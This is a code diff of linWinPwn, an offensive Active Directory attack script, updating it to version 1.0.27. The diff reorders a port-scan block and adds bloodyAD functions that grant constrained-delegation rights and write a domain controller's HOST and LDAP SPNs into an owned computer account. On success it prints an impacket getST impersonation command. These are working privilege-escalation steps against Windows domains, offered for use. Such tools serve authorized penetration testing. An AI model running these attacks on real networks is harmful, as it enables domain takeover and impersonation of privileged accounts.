@@ -142,7 +142,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.0.26 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.0.27 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -416,23 +416,6 @@ prepare() {
         if [ -z "$domain" ]; then domain=$dc_domain; fi
     fi
 
-    dc_open_ports=$(${nmap} -n -Pn -p 135,445,389,636,88,3389,5985 "${dc_ip}" -sT -T5 --open -oG "${output_dir}/Scans/${dc_ip}"_mainports)
-    if [[ $dc_open_ports == *"135/tcp"* ]]; then dc_port_135="${GREEN}open${NC}"; else dc_port_135="${RED}filtered|closed${NC}"; fi
-    if [[ $dc_open_ports == *"445/tcp"* ]]; then dc_port_445="${GREEN}open${NC}"; else dc_port_445="${RED}filtered|closed${NC}"; fi
-    if [[ $dc_open_ports == *"389/tcp"* ]]; then dc_port_389="${GREEN}open${NC}"; else dc_port_389="${RED}filtered|closed${NC}"; fi
-    if [[ $dc_open_ports == *"636/tcp"* ]]; then dc_port_636="${GREEN}open${NC}"; else dc_port_636="${RED}filtered|closed${NC}"; fi
-    if [[ $dc_open_ports == *"88/tcp"* ]]; then dc_port_88="${GREEN}open${NC}"; else dc_port_88="${RED}filtered|closed${NC}"; fi
-    if [[ $dc_open_ports == *"3389/tcp"* ]]; then dc_port_3389="${GREEN}open${NC}"; else dc_port_3389="${RED}filtered|closed${NC}"; fi
-    if [[ $dc_open_ports == *"5985/tcp"* ]]; then dc_port_5985="${GREEN}open${NC}"; else dc_port_5985="${RED}filtered|closed${NC}"; fi
-
-    if [ "${autoconfig_bool}" == true ]; then
-        echo -e "${BLUE}[*] Running auto-config... ${NC}"
-        ntp_update
-        etc_hosts_update
-        etc_resolv_update
-        etc_krb5conf_update
-    fi
-
     if [ "${user}" == "" ]; then user_out="null"; else user_out=${user// /}; fi
     output_dir="${output_dir}/linWinPwn_${dc_domain}_${user_out}"
     command_log="$output_dir/$(date +%Y-%m-%d)_command.log"
@@ -452,6 +435,23 @@ prepare() {
     mkdir -p "${output_dir}/DomainRecon/Servers"
     mkdir -p "${output_dir}/DomainRecon/Users"
     mkdir -p "${output_dir}/Scans"
+
+    dc_open_ports=$(${nmap} -n -Pn -p 135,445,389,636,88,3389,5985 "${dc_ip}" -sT -T5 --open -oG "${output_dir}/Scans/${dc_ip}"_mainports)
+    if [[ $dc_open_ports == *"135/tcp"* ]]; then dc_port_135="${GREEN}open${NC}"; else dc_port_135="${RED}filtered|closed${NC}"; fi
+    if [[ $dc_open_ports == *"445/tcp"* ]]; then dc_port_445="${GREEN}open${NC}"; else dc_port_445="${RED}filtered|closed${NC}"; fi
+    if [[ $dc_open_ports == *"389/tcp"* ]]; then dc_port_389="${GREEN}open${NC}"; else dc_port_389="${RED}filtered|closed${NC}"; fi
+    if [[ $dc_open_ports == *"636/tcp"* ]]; then dc_port_636="${GREEN}open${NC}"; else dc_port_636="${RED}filtered|closed${NC}"; fi
+    if [[ $dc_open_ports == *"88/tcp"* ]]; then dc_port_88="${GREEN}open${NC}"; else dc_port_88="${RED}filtered|closed${NC}"; fi
+    if [[ $dc_open_ports == *"3389/tcp"* ]]; then dc_port_3389="${GREEN}open${NC}"; else dc_port_3389="${RED}filtered|closed${NC}"; fi
+    if [[ $dc_open_ports == *"5985/tcp"* ]]; then dc_port_5985="${GREEN}open${NC}"; else dc_port_5985="${RED}filtered|closed${NC}"; fi
+
+    if [ "${autoconfig_bool}" == true ]; then
+        echo -e "${BLUE}[*] Running auto-config... ${NC}"
+        ntp_update
+        etc_hosts_update
+        etc_resolv_update
+        etc_krb5conf_update
+    fi
 
     if [ ! -f "${servers_ip_list}" ]; then /bin/touch "${servers_ip_list}"; fi
     if [ ! -f "${servers_hostname_list}" ]; then /bin/touch "${servers_hostname_list}"; fi
@@ -3280,6 +3280,58 @@ add_upn() {
     echo -e ""
 }
 
+add_constrained() {
+    if [ ! -f "${bloodyad}" ]; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
+    else
+        mkdir -p "${output_dir}/Modification/bloodyAD"
+        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
+            echo -e "${BLUE}[*] Adding Constrained Delegation rights on owned account. Please specify target:${NC}"
+            echo -e "${CYAN}[*] Example: DC01 or FILE01 ${NC}"
+            target_consdeleg=""
+            read -rp ">> " target_consdeleg </dev/tty
+            while [ "${target_consdeleg}" == "" ]; do
+                echo -e "${RED}Invalid name.${NC} Please specify target:"
+                read -rp ">> " target_consdeleg </dev/tty
+            done
+            echo -e "${CYAN}[*] Adding Constrained Delegation rights to ${target_consdeleg}${NC}"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add uac '${target_consdeleg}$' -f TRUSTED_TO_AUTH_FOR_DELEGATION" 2>&1 | tee -a "${output_dir}/Modification/bloodyAD/bloodyad_out_consdeleg_${dc_domain}.txt"
+        fi
+    fi
+    echo -e ""
+}
+
+add_spn_constrained() {
+    if [ ! -f "${bloodyad}" ]; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
+    else
+        mkdir -p "${output_dir}/Modification/bloodyAD"
+        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
+            echo -e "${BLUE}[*] Adding SPNs of Domain Controller to owned computer account (msDS-AllowedToDelegateTo). Please specify target:${NC}"
+            echo -e "${CYAN}[*] Example: DC01 or FILE01 ${NC}"
+            target_spn=""
+            read -rp ">> " target_spn </dev/tty
+            while [ "${target_spn}" == "" ]; do
+                echo -e "${RED}Invalid name.${NC} Please specify target:"
+                read -rp ">> " target_spn </dev/tty
+            done
+            echo -e "${CYAN}[*] Adding DC HOST and LDAP SPNs to ${target_spn}${NC}"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set object '${target_spn}$' msDS-AllowedToDelegateTo -v 'HOST/${dc_NETBIOS}' -v 'HOST/${dc_FQDN}' -v 'LDAP/${dc_NETBIOS}' -v 'LDAP/${dc_FQDN}'" 2>&1 | tee -a "${output_dir}/Modification/bloodyAD/bloodyad_out_spn_const_${dc_domain}.txt"
+            if grep -q -a "has been updated" "${output_dir}/Modification/bloodyAD/bloodyad_out_spn_const_${dc_domain}.txt"; then
+                echo -e "${GREEN}[+] Adding DC SPNs successful! Run command below to generate impersonated ticket ${NC}"
+                echo -e "${impacket_getST} -spn '< HOST/${dc_FQDN} OR LDAP/${dc_FQDN} >' -impersonate ${dc_NETBIOS} ${domain}/'${target_spn}$':'< password of ${target_spn} >'"
+            fi
+        fi
+    fi
+    echo -e ""
+}
+
 ###### pwd_dump: Password Dump
 juicycreds_dump() {
     echo -e "${BLUE}[*] Search for juicy credentials: Firefox, KeePass, Rdcman, Teams, WiFi, WinScp${NC}"
@@ -5236,9 +5288,11 @@ modif_menu() {
     echo -e "9) Perform RBCD attack on SPN-less user (Requires: GenericWrite or GenericAll or AllowedToAct on computer & MAQ=0)"
     echo -e "10) Perform ShadowCredentials attack (Requires: AddKeyCredentialLink)"
     echo -e "11) Abuse GPO to execute command (Requires: GenericWrite or GenericAll on GPO)"
-    echo -e "12) Add Unconstrained Delegation rights (Requires: SeEnableDelegationPrivilege rights)"
-    echo -e "13) Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights (Requires: Owner of computer)"
-    echo -e "14) Add userPrincipalName to perform Kerberos impersonation (Requires: GenericWrite or GenericAll on user)"
+    echo -e "12) Add Unconstrained Delegation rights - uac: TRUSTED_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege rights)"
+    echo -e "13) Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights - ServicePrincipalName & msDS-AdditionalDnsHostName (Requires: Owner of computer)"
+    echo -e "14) Add userPrincipalName to perform Kerberos impersonation of another user (Requires: GenericWrite or GenericAll on user)"
+    echo -e "15) Add Constrained Delegation rights - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege rights)"
+    echo -e "16) Add HOST and LDAP SPN entries of DC to computer with Constrained Deleg rights - msDS-AllowedToDelegateTo (Requires: Owner of computer)"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -5312,7 +5366,17 @@ modif_menu() {
 
     14)
         add_upn
-        main_menu
+        modif_menu
+        ;;
+
+    15)
+        add_constrained
+        modif_menu
+        ;;
+
+    16)
+        add_spn_constrained
+        modif_menu
         ;;
 
     back)
